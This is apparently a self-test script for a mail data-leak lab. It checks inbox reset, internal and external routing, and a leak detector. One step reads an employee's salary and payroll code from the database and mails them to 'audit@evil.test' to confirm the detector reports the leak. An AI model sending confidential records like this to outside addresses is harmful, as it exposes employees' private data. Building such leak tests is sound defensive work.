import sqlite3
import sys

import config
from lab import leak_checker, load_mail, mail_client, reset_lab

results = []


def check(name, cond):
    results.append(cond)
    print(("PASS  " if cond else "FAIL  ") + name)


reset_lab.reset()
print()

check("Sau reset: 2 hop thu deu trong",
      len(mail_client.list_messages(config.INTERNAL_MAIL)) == 0
      and len(mail_client.list_messages(config.EXTERNAL_MAIL)) == 0)

n = load_mail.load_dir("attacks/benign")
check("Nap email mau vao hop thu noi bo", n >= 1 and mail_client.latest_message() is not None)
check("Doc duoc thu moi nhat", "weekly report" in mail_client.latest_message()["subject"].lower())

check("Gui cho @company.test -> hop thu NOI BO",
      mail_client.send_mail("manager@company.test", "Hi", "Noi dung binh thuong") == "internal")
check("Gui cho dia chi la -> hop thu BEN NGOAI",
      mail_client.send_mail("partner@other.test", "Hello", "Noi dung binh thuong") == "external")

r = leak_checker.check_external()
check("Thu sach o hop thu ngoai -> bo do bao SACH", r["messages"] == 1 and not r["leaked"])

con = sqlite3.connect(config.DB_PATH)
salary, code = con.execute(
    "SELECT base_salary, payroll_code FROM salaries WHERE employee_id = 1").fetchone()
con.close()
body = f"Employee 1 salary: {salary:,} VND, payroll code {code}"
mail_client.send_mail("audit@evil.test", "Report", body)
r = leak_checker.check_external()
check("Thu chua du lieu mat -> bo do bao RO RI", r["leaked"] and r["leaked_mails"] == 1)
check("Bat duoc ca so tien (co dau phay) lan canary chuoi", r["distinct_markers"] >= 2)

print(f"\nTong: {sum(results)}/{len(results)} dat")
sys.exit(0 if all(results) else 1)